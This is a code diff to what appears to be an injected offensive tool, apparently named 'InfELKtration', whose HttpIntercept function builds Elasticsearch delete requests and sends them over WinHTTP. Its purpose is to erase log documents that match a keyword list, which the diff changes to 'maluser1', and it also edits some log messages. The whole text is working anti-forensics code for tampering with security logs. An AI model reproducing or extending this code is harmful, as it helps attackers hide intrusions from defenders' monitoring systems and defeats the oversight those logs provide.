@@ -6,10 +6,9 @@
 
 #pragma warning( disable : 6386 )
 
-#define NUM_MAL_WORDS 2
+#define NUM_MAL_WORDS 1
 const char* maliciousKeywords[NUM_MAL_WORDS] = {
-	"hjkl333",
-	"hjkl444"
+	"maluser1"
 };
 
 const wchar_t* acceptTypes[2] = {
@@ -90,6 +89,8 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	// the index is at postBody+0x500, and the id is at postBody+0x580
 	sprintf_s((char*)postBody, 0x500, "{\"delete\":{\"_index\":\"%s\",\"_id\":\"%s\"}}\n", (char*)postBody + 0x500, (char*)postBody + 0x580);
 	len = (DWORD)strlen((char*)postBody);
+	
+	Logger::Info("Deleting ES document %s", (char*)postBody + 0x580);
 
 	// start an HTTP session
 	hSession = WinHttpOpen(L"InfELKtrationInject/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
@@ -138,7 +139,7 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 		goto closeReq;
 	}
 
-	Logger::Info("Deleted ES document %s", (char*)postBody + 0x580);
+	Logger::Info("Successfully deleted ES document %s", (char*)postBody + 0x580);
 
 closeReq:
 	WinHttpCloseHandle(hRequest);
